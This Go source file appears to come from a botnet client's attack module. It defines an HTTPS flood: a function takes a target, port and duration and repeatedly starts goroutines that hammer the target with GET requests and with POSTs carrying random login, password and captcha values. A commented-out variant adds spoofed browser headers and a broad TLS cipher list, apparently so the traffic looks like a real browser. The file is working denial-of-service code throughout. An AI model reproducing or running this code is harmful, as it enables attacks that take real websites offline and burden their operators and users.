package methods

import (
	"fmt"
	"homo/client/balancer"
	"homo/client/utils"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func HttpsDefault(target string, port string, duration string) {

	duration = strings.ReplaceAll(duration, "\x00", "")
	duration = strings.ReplaceAll(duration, "\x03", "")
	duration = strings.ReplaceAll(duration, "\r", "")

	dur, err := strconv.Atoi(string(duration))

	if err != nil {
		fmt.Println(err)
	}
	sec := time.Now().Unix()
	for time.Now().Unix() <= sec+int64(dur)-1 {
		go httpattack(target)
		go httpattack(target)
		go httpattack(target)

		time.Sleep(100 * time.Millisecond)

	}
}

func httpattack(target string) {
	for i := 0; i < 30; i++ {
		select {
		case <-balancer.BalanceCh:
			fmt.Println("Balancer")
			time.Sleep(5 * time.Second)
		default:
			fmt.Println(i)
			fmt.Println(target)
			http.Get(target)
			http.PostForm(target, url.Values{"login": {utils.RandomString(5)}, "password": {utils.RandomString(5)}, "captcha": {utils.RandomString(5)}})
			time.Sleep(10 * time.Millisecond)
		}
	}
}

// func getreq(target string) {

// 	tlsconf := &tls.Config{
// 		CipherSuites: []uint16{
// 			tls.TLS_AES_256_GCM_SHA384,
// 			tls.TLS_RSA_WITH_RC4_128_SHA,
// 			tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,
// 			tls.TLS_RSA_WITH_AES_128_CBC_SHA,
// 			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
// 			tls.TLS_RSA_WITH_AES_128_CBC_SHA256,
// 			tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
// 			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
// 			tls.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA,
// 			tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
// 			tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
// 			tls.TLS_ECDHE_RSA_WITH_RC4_128_SHA,
// 			tls.TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA,
// 			tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
// 			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
// 			tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256,
// 			tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,
// 			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
// 			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
// 			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
// 			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
// 			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
// 			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
// 			tls.TLS_AES_128_GCM_SHA256,
// 			tls.TLS_AES_256_GCM_SHA384,
// 			tls.TLS_CHACHA20_POLY1305_SHA256,
// 			tls.TLS_FALLBACK_SCSV,
// 			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
// 			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
// 			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
// 		},
// 	}

// 	tr := &http.Transport{
// 		TLSClientConfig: tlsconf,
// 	}
// 	client := &http.Client{Transport: tr}

// 	rand.Seed(time.Now().UTC().UnixNano())
// 	req, _ := http.NewRequest("GET", target, nil)

// 	req.Header.Add("User-Agent", utils.GetUserAgent())
// 	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
// 	req.Header.Add("Accept-Encoding", "gzip, deflate, br")
// 	req.Header.Add("Accept-Language", "en-US,en;q=0.5")
// 	req.Header.Add("Connection", "keep-alive")
// 	req.Header.Set("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
// 	resp, err := client.Do(req)
// 	if err != nil {
// 		fmt.Println(err)
// 		return
// 	}
// 	defer resp.Body.Close()
// }
